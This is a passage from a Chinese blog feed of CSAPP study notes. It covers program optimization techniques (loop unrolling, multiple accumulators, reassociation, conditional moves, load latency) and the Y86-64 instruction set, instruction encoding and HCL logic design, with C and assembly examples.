href="#消除不必要的内存引用-1" class="headerlink" title="消除不必要的内存引用"></a>消除不必要的内存引用</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">combine4</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br>    <span class="hljs-type">data_t</span> acc = IDENT;  <span class="hljs-comment">// 计算结果保存在局部变量，减少内存寻址次数</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; length; i++)<br>    &#123;<br>        <span class="hljs-type">data_t</span> val;<br>        acc = acc OP data[i];<br>    &#125;<br>    *dest = acc;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><p>循环展开是一种程序变换，通过增加每次迭代计算的元素的数量，减少循环的迭代次数。</p><p>循环展开能够从两个方面改进程序的性能：</p><ul><li>它减少了不直接有助于程序结果的操作的数量，例如循环索引计算和条件分支。</li><li>它提供了一些方法，可以进一步变化代码，减少整个计算中关键路径上的操作数量。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">combine5</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);C<br>    <span class="hljs-type">long</span> limit = length - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br>    <span class="hljs-type">data_t</span> acc = IDENT;<br><br>    <span class="hljs-comment">// 2x1 循环展开</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; limit; i+=<span class="hljs-number">2</span>)<br>    &#123;<br>        acc = (acc OP data[i]) OP data[i+<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (; i &lt; length; i++)<br>    &#123;<br>        acc = acc OP data[i];<br>    &#125;<br>    *dest = acc;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="提高并行性"><a href="#提高并行性" class="headerlink" title="提高并行性"></a>提高并行性</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">combine6</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">long</span> limit = length - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br>    <span class="hljs-type">data_t</span> acc0 = IDENT;  <span class="hljs-comment">// 多个累积变量</span><br>    <span class="hljs-type">data_t</span> acc1 = IDENT;<br><br>    <span class="hljs-comment">// 2x2 循环展开</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; limit; i+=<span class="hljs-number">2</span>)&#123;<br>        acc0 = acc0 OP data[i];<br>        acc1 = acc1 OP data[i+<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (; i &lt; length; i++)&#123;<br>        acc0 = acc0 OP data[i];<br>    &#125;<br>    *dest = acc0 OP acc1;<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里程序已经突破了延迟界限。</p><h3 id="重新结合变换"><a href="#重新结合变换" class="headerlink" title="重新结合变换"></a>重新结合变换</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C">C<br><span class="hljs-type">void</span> <span class="hljs-title function_">combine7</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">long</span> limit = length - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br>    <span class="hljs-type">data_t</span> acc = IDENT;<br><br>    <span class="hljs-comment">// 2x1a 循环展开</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; limit; i+=<span class="hljs-number">2</span>)&#123;<br>        acc = acc OP (data[i] OP data[i+<span class="hljs-number">1</span>]);  <span class="hljs-comment">// 重新结合</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (; i &lt; length; i++)&#123;<br>        acc = acc OP data[i];<br>    &#125;<br>    *dest = acc;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="一些限制因素"><a href="#一些限制因素" class="headerlink" title="一些限制因素"></a>一些限制因素</h1><h3 id="寄存器溢出"><a href="#寄存器溢出" class="headerlink" title="寄存器溢出"></a>寄存器溢出</h3><p>循环并行性的好处受汇编代码描述计算的能力限制。如果我们的并行度户超过了可用的奇存器数量，那么编译器会诉诸**溢出(spilling)**，将某些临时值存放到内存中，通常是在运行时堆栈上分配空间，造成性能下降。解决办法是控制循环展开的数量。</p><h3 id="分支预测错误处罚"><a href="#分支预测错误处罚" class="headerlink" title="分支预测错误处罚"></a>分支预测错误处罚</h3><p>当分支预测逻辑不能正确预测一个分支是否要跳转的时候，条件分支可能会招致很大的预测错误处罚。</p><p>解决方案如下：</p><ul><li><p>不要过分关心可预测的分支</p><p>比如 combine4 中的边界检查，我们可以直接使用不用边界检查的函数。处理器能够预测这些分支的结果，所以这些求值都不会对形成程序执行中关键路径的指令的取指和处理产生太大的影响。</p></li><li><p>书写适用条件传送的代码</p><p>使用“功能性”代码代替”命令式“代码，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 优化前命令式</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">minmax1</span><span class="hljs-params">(<span class="hljs-type">long</span> a[], <span class="hljs-type">long</span> b[], <span class="hljs-type">long</span> n)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;n; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (a[i] &gt; b[i])<br>        &#123;  <span class="hljs-comment">// 分支预测错误时损耗很大</span><br>            <span class="hljs-type">long</span> t = a[i];  <span class="hljs-comment">// 交换a[i]和b[i]</span><br>            a[i] = b[i];<br>            b[i] = t;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 优化后功能性的</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">minmax1</span><span class="hljs-params">(<span class="hljs-type">long</span> a[], <span class="hljs-type">long</span> b[], <span class="hljs-type">long</span> n)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;n; i++)<br>    &#123;<br>        <span class="hljs-type">long</span> min = a[i] &lt; b[i] ? a[i] : b[i];  <span class="hljs-comment">// 编译为条件传送汇编代码，避免分支预测</span><br>        <span class="hljs-type">long</span> max = a[i] &lt; b[i] ? b[i] : a[i];<br>        a[i] = min;<br>        b[i] = max;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="理解内存的性能"><a href="#理解内存的性能" class="headerlink" title="理解内存的性能"></a>理解内存的性能</h1><p>我们所做的测试都只是访问比较少的内存，内存的性能还没有影响到程序的性能。接下来我们会进一步考虑设计加载和存储操作的程序的性能。</p><h3 id="加载的性能"><a href="#加载的性能" class="headerlink" title="加载的性能"></a>加载的性能</h3><p>一个包含加载操作的程序的性能既依赖于流水线的能力，也依赖于加载单元的延迟。</p><p>例如，在下面的函数中，由一系列加载操作组成的一个计算，一条加载操作的结果决定下一条操作的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ELF</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ELF</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-type">long</span> data;<br>&#125;list_ele,*list_ptr;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">list_len</span><span class="hljs-params">(list_ptr ls)</span><br>&#123;<br>    <span class="hljs-type">long</span> len=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(ls)<br>    &#123;<br>        len++;<br>        ls=ls-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> len;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个函数的循环中，变量 <code>ls</code> 的每个后续值依赖于指针引用 <code>s-&gt;next</code> 读出的值。</p><p>测试表明函数 list_len 的 CPE 为 4.00，我们认为这直接表明了加载操作的延迟。我们考虑一下循环的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L3                                 ;loop:<br>    addq $1, %rax                   ;    Increment len<br>    movq (%rdi), %rdi               ;    ls=ls-&gt;next<br>    testq %rdi, %rdi                ;    test ls<br>    jne .L3<br></code></pre></td></tr></table></figure><p>第 3 行上的 movq 指令是这个循环中关键的瓶颈。后面存器 rdi 的每个值都依赖于加载操作的结果，而加载操作又以 rdi 中的值作为它的地址。因此，直到前一次选代的加载操作完成，下一次迭代的加载操作才能开始。这个函数的 CPE 等于 4.00，是由加载操作的延迟决定的。</p><h3 id="存储的性能"><a href="#存储的性能" class="headerlink" title="存储的性能"></a>存储的性能</h3><blockquote><p>这一节就是在讲减少存储操作优化性能，例子就不敲了感觉这一节还好懂的   <del>我是懒惰虫</del></p></blockquote><p>存储操作即将寄存器的值写到内存。</p><p>内存操作的实现包括许多细微之处。对于寄存器操作，在指令被译码成操作的时候，处理器就可以确定哪些指令会影响其他哪些指令。另一方面，对于内存操作，只有到计算出加载和存储的地址被计算出来以后，处理器才能确定哪些指令会影响其他的哪些。</p><h1 id="应用：性能提高技术"><a href="#应用：性能提高技术" class="headerlink" title="应用：性能提高技术"></a>应用：性能提高技术</h1><p>我们已经描述了许多优化程序性能的基本策略：</p><h4 id="高级设计"><a href="#高级设计" class="headerlink" title="高级设计"></a>高级设计</h4><ul><li>选择适当的算法和数据结构</li></ul><h4 id="基本编码原则"><a href="#基本编码原则" class="headerlink" title="基本编码原则"></a>基本编码原则</h4><ul><li>消除连续函数调用，将计算移到循环外</li><li>消除不必要的内存引用，引入临时变量来存储中间结果</li></ul><h4 id="低级优化"><a href="#低级优化" class="headerlink" title="低级优化"></a>低级优化</h4><ul><li>循环展开</li><li>使用多个累积变量、重新结合技术提高指令级并行</li><li>用功能性风格重写条件操作，使编译采用条件传送</li></ul><hr><p>开辟了 .md 文件内联公式块新技能！🥳</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F.png"></p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第四章 处理器体系结构</title>
    <link href="/2023/10/22/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    <url>/2023/10/22/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p>通过设计一个 Y86-64 体系结构来理解处理器</p><span id="more"></span><p>一个处理器支持的指令和指令的字节集编码被称为它的指令集体系结构（Instruction-Set Architecture，<strong>ISA</strong>）。我们之前一直学习的处理器的命令就是 ”x86-64“ 的指令集。</p><p>不同的处理器“家族”有不同的ISA。同一个家族里也有不同型号的处理器，但是大多保持兼容。</p><h1 id="Y86-64指令集体系结构"><a href="#Y86-64指令集体系结构" class="headerlink" title="Y86-64指令集体系结构"></a>Y86-64指令集体系结构</h1><blockquote><p>这并不是一个真实被应用的指令集，这是为了方便学习来根据 x86-64定义的一个精简版指令集体系结构</p></blockquote><h3 id="程序员可见的状态"><a href="#程序员可见的状态" class="headerlink" title="程序员可见的状态"></a>程序员可见的状态</h3><ul><li><p>Y86-64程序中的每条指令都会读取或修改处理器状态的某些部分，这称为<strong>程序员可见的状态</strong>。</p></li><li><p>这里的“程序员”既可以是用汇编代码写程序的人，也可以是产生机器级代码的编译器</p></li></ul><blockquote><p>在处理器的实现中，只要我们保证机器及程序能够访问程序员可见状态，就不需要完全按照 ISA 暗示的方法来表示和组织这个处理器状态</p></blockquote><p>Y86-64 的状态类似 x86-64 。有 15 个寄存器：%rax，%rcx，%rdx，%rbx，%rsp，%rbp，%rsi，%rdi 以及 %r8-%r14，每个寄存器存储一个 64 位的字。为了简化指令编码，我们减少了一个 %r15 寄存器。</p><p>其中，**%rsp 作为栈指针<strong>被用于入栈出栈，</strong>程序计数器<strong>（PC，也就是%rip）</strong>存放当前指令执行的地址**。</p><p>除此之外还有 3 个 1 位的<strong>条件码 ZF、SF 和 OF，用于条件跳转</strong>。程序状态的最后一个部分是<strong>状态码（Stat），表示程序的总体状态</strong>，提示程序正常是否运行或者是出现了某种异常。</p><p>其他的概念我们都认为它和 x86-64 相同或更加简化。</p><h3 id="Y86-64-指令"><a href="#Y86-64-指令" class="headerlink" title="Y86-64 指令"></a>Y86-64 指令</h3><p>如下图就是我们的 Y86-64 指令的简单描述，左边是指令的汇编码表示，右边是字节编码：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-Y86-64%E6%8C%87%E4%BB%A4.png"></p><h5 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h5><p>x86-64 的 movq 指令被分为了 4 个不同的指令，irmovq、rrmovq、mrmovq、rmmovq，分别对应了源和目的的种类数：立即数-寄存器，寄存器-寄存器，内存-寄存器，寄存器-内存。Y86-64 与 x86-64 相同，不允许直接从内存地址传送到另一个内存地址，必须通过寄存器传送。</p><h5 id="整数操作指令"><a href="#整数操作指令" class="headerlink" title="整数操作指令"></a>整数操作指令</h5><p>有四种类型的整数操作（addq，subq，andq，xorq），他们只对寄存器进行操作。除此之外，这些指令还会设置条件码。</p><h5 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h5><p>有七个跳转指令，一个无条件跳转和六个条件跳转（jle，jl，je，jne，jge，jg），工作原理和 X86-64 相同。</p><h5 id="条件传送指令"><a href="#条件传送指令" class="headerlink" title="条件传送指令"></a>条件传送指令</h5><p>有六个条件传送指令（cmovXX），与条件跳转类似。</p><h5 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h5><p>call 指令，将返回地址入栈，然后跳到目的地址。ret 指令从调用中返回。</p><h5 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h5><p>也与 x86-64 类似，有入栈（push）和出栈（pop）的操作。</p><h3 id="指令编码"><a href="#指令编码" class="headerlink" title="指令编码"></a>指令编码</h3><blockquote><p>具体图示如上一小节示例图</p></blockquote><p>每一个指令的第一个字节表示指令的类型，而这一个字节又分为两部分：高 4 位是代码部分，低 4 位是功能部分.其中功能值只有在一组相关指令共用一个代码才会被使用。如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-Y86-64%E6%8C%87%E4%BB%A4%E5%85%B7%E4%BD%93%E5%8A%9F%E8%83%BD%E7%A0%81.png"></p><p>有的指令只有一字节长，有的就需要附加的寄存器指示符字节来指定一个或者两个寄存器，这些寄存器称为 rA 和 rB 。</p><p>15 个寄存器每一个都有自己的标识符，范围是 0~0xE。如果寄存器的字段为0xF，就表示此处没有寄存器操作数，只需要一个寄存器的指令比如 pushq 和 popq 指令，也会将其他的寄存器设置为 0xF。</p><p>分支指令调用的地址是绝对地址而不是 PC 寻址，因为我们更注重描述的简单性。</p><p><strong>指令集的一个重要的性质是字节编码必须有唯一的解释。</strong></p><h3 id="Y86-64异常"><a href="#Y86-64异常" class="headerlink" title="Y86-64异常"></a>Y86-64异常</h3><p>对于 Y86-64 来讲，程序员可见的状态包括状态码 start ，它描述程序执行的总体状态。而其他的代码则表示发生了某种类型的异常，具体如下表：</p><table><thead><tr><th align="center">值</th><th align="center">名字</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">AOK</td><td align="center">正常操作</td></tr><tr><td align="center">2</td><td align="center">HLT</td><td align="center">遇到halt指令</td></tr><tr><td align="center">3</td><td align="center">ADR</td><td align="center">遇到非法地址</td></tr><tr><td align="center">4</td><td align="center">INS</td><td align="center">遇到非法指令</td></tr></tbody></table><p>在Y86-64 中，我们简化处理，让程序遇到异常就停止执行指令而不是单独编写一个异常处理程序。</p><h3 id="Y86-64程序"><a href="#Y86-64程序" class="headerlink" title="Y86-64程序"></a>Y86-64程序</h3><p>Y86-64 代码与 x86-64 代码类似，但有以下几点不同：</p><ul><li>add 指令不能直接加一个常数，Opq 指令只能对两个寄存器做运算。因为 Y86-64 的算术指令中<strong>不能使用立即数</strong>，需要先加载到寄存器中。</li><li>subq 指令可以<strong>直接设置条件码</strong>。在 x86-64 架构下，我们需要再多一个 test 命令才能实现设置条件码。</li></ul><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.pos 0<br>irmovq stack,%rsp<br>call main<br>halt<br><br>array:<br>.quad 0x000d000d000d<br>.quad 0x00c000c000c0<br>.quad 0x0b000b000b00<br>.quad 0xa000a000a000<br><br>main:<br>irmovq array,%rdi<br>irmovq $4,%rsi<br>call sum         <br>ret<br><br>sum:<br>irmovq $8,%r8<br>irmovq $1,%r9<br>xorq %rax,%rax<br>andq %rsi,%rsi<br>jmp test<br><br>loop:<br>mrmovq (%rdi),%r10<br>addq %r10,%rax<br>addq %r8,%rdi<br>subq %r9,%rsi<br><br>test:<br>jne loop<br>ret<br><br>.pos 0x200<br>stack:<br></code></pre></td></tr></table></figure><p>在上面的程序中，以 . 开头的词是汇编器伪指令，他们告诉汇编器台哦正地址，以便产生代码或者插入数据。例如 <code>.pos 0</code> 告诉汇编器应该从地址0 处产生代码。</p><p>其他的代码指令和 x86-64含义相同，我们可以推断出这个函数目的实现 <code>WORD sum(WORD *array,WORD length)</code>，而该函数会求出 array[0]~array[length] 的和。</p><h3 id="一些-Y86-64-指令的详情"><a href="#一些-Y86-64-指令的详情" class="headerlink" title="一些 Y86-64 指令的详情"></a>一些 Y86-64 指令的详情</h3><p>需要特别注意 pushq 指令和 popq 指令。</p><p>pushq 指令会把栈指针减 8 ，并将一个寄存器值写入内存中，当我们执行 <code>pushq %rsp</code> 时，处理器的行为是不确定的，因为入栈的寄存器会在这条指令中被更改状态，这种情况下就会存在两种不同的结果：</p><ul><li>压入 %rsp 的原始值（x86-64采用的约定）</li><li>压入减去 8 的 %rsp 的值</li></ul><p>我们运行书中的测试程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq %rsp,%rax<br>pushq %rsp<br>popq %rdx<br>subq %rdx,%rax<br>ret<br></code></pre></td></tr></table></figure><p>它的返回值总是0，也就是说 pushq 指令是先放后减。</p><p>同样 popq 也有这样的歧义，树上的测试程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq %rsp,%rdi<br>pushq $0xabcd<br>popq %rsp<br>movq %rsp,%rax<br>movq %rdi,%rsp<br>ret<br></code></pre></td></tr></table></figure><p>函数的返回值总是 0xabcd，说明 <code>pop %rsp</code> 是先减去了 %rsp 再赋的值。</p><p>也就是说，push 和 pop 两个指令在对 %rsp 寄存器本身操作时，都会尽量保证得到的值是原始值。</p><ul><li><p>pushq %rsp 一定会压最初的 %rsp。</p></li><li><p>popq %rsp 一定是把那个值正确地给到了 %rsp。</p></li></ul><h1 id="逻辑设计和硬件控制语言-HCL"><a href="#逻辑设计和硬件控制语言-HCL" class="headerlink" title="逻辑设计和硬件控制语言 HCL"></a>逻辑设计和硬件控制语言 HCL</h1><blockquote><p>这部分应该是模电（还是叫数电？）的知识叭应该</p></blockquote><h3 id="逻辑门"><a href="#逻辑门" class="headerlink" title="逻辑门"></a>逻辑门</h3><p>逻辑门是数学电路的基本计算单元，它产生的输出等于他们输入<strong>位值</strong>的某个布尔函数。</p><p>常见的逻辑门就是 and 、or 、not，并且 and 、or 常见为两输入，但是可以扩展到 n 输入的状态，比如三输入的与门用 HCL 表示就为 <code>a&amp;&amp;b&amp;&amp;c</code>。逻辑门总是活动的，一旦一个门的输入发生变化，在很短的时间内输出也会相应变化。</p><h3 id="组合电路和HCL-布尔表达式"><a href="#组合电路和HCL-布尔表达式" class="headerlink" title="组合电路和HCL 布尔表达式"></a>组合电路和HCL 布尔表达式</h3><p>将很多的逻辑门组合成一个网，就能构建计算块，成为组合电路。如何构建这些网有以下的限制：</p><ul><li><p>每个逻辑门的输入必须连接到三个选择项之一：一个系统的输入、某个寄存器单元的输入或某个逻辑门的输入</p></li><li><p>两个或多个逻辑门的输入不能连接在一起</p></li><li><p>网必须是无环的，也就是说不能形成回路</p></li></ul><p>多路复用器（MUX）根据输入控制信号的值，从一组不同的数据信号中选择一个。</p><p>HCL 组合逻辑电路和 C 语言逻辑表达式之间有以下不同：</p><ul><li><p>组合电路会持续地响应输入的变化，C 语言只会在程序运行过程中对应语句被执行到才会进行求值</p></li><li><p>C 语言的逻辑表达式允许参数是任意整数，会自动转化为0 (false) 和非0 (true) ，而逻辑门只对位值 0 和 1 进行操作</p></li><li><p>C 逻辑表达式可能会出现部分求值的特性，如果一个 and 或者 or 运算只对第一个参数求值之后就能确定，那么就不会对第二个参数求值了，而组合逻辑电路没有这种规则。</p></li></ul><h3 id="字级的组合电路和HCL整数表达式"><a href="#字级的组合电路和HCL整数表达式" class="headerlink" title="字级的组合电路和HCL整数表达式"></a>字级的组合电路和HCL整数表达式</h3><p>利用逻辑门组合成的网，我们就可以设计出对数据字操作的电路。其中，组合电路分局输入字的每个位，用逻辑门分别计算输出字的每一位。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%AD%97%E7%BA%A7%E7%BB%84%E5%90%88%E7%94%B5%E8%B7%AF.png"></p><p>在 HCL 中，多路复用函数使用<strong>情况表达式</strong>来描述的，情况表达式的通用格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs hcl">[<br>select1:expr1;<br>select2:expr2;<br>select3:expr3;<br>...<br>selectk:exprk;<br>]<br></code></pre></td></tr></table></figure><p>表达式包含一系列的情况，每种情况 i 都有一个布尔表达式 select 和一个整数表达式 expr ，分别表示什么时候选择这种情况和会得到什么值。</p><p>需要注意的是，情况表达式并<strong>不要求各个不同的选项之间互斥</strong>，但是并不会出现多个结果，在实际的选择过程中是按<strong>顺序进行</strong>的，且第一个求值为1的情况会被选中。</p><p>eg：设计一个逻辑电路来找一组字  a、b、c 的最小值，就可以这样表达：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word min=[<br>a&lt;=b &amp;&amp;a&lt;=c : a;<br>b&lt;=a &amp;&amp;b&lt;=c : b;<br>1           : c;<br>]<br></code></pre></td></tr></table></figure><p>其中最后一个选择表达式1，意味如果前面的都没有被选中，那就选择这种情况。这也是比较常用的指定默认情况的方法。</p><h3 id="集合关系"><a href="#集合关系" class="headerlink" title="集合关系"></a>集合关系</h3><p>集合关系用来将一个信号与许多可能匹配的信号作比较，以此来检测正在处理的某个指令是否<strong>属于</strong>某一类指令代码。</p><p>判断集合关系的通用格式是：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">iexpr in </span><span class="hljs-template-variable">&#123;iexpr1,iexpr2,...,iexprk&#125;</span><br></code></pre></td></tr></table></figure><h3 id="存储器时钟"><a href="#存储器时钟" class="headerlink" title="存储器时钟"></a>存储器时钟</h3><p>组合电路从本质上讲并不存储任何信息，我们想要产生时序电路必须引进按位存储信息的设备。</p><p>存储设备都是由同一个时钟控制的，时钟是一个周期性的信号，决定什么时候要把新值加载到设备中。我们考虑以下两种存储器设备：</p><ul><li>时钟寄存器（简称寄存器）：存储单个位或字，时钟信号控制寄存器加载输入值。</li><li>随机访问存储器（简称内存，Random Access Memory）：存储多个字，通过地址选择该读或该写哪些字。</li></ul><p>需要注意的是硬件中的 ”寄存器“ 和机器级编程中的 ”寄存器“ 并不是完全相同的概念，硬件中的寄存器是一个电子元件，机器编程中寄存器代表 CPU 中可寻址的字，它们存储在寄存器文件中。我们分别称呼这两类寄存器位 ”硬件寄存器“ 和 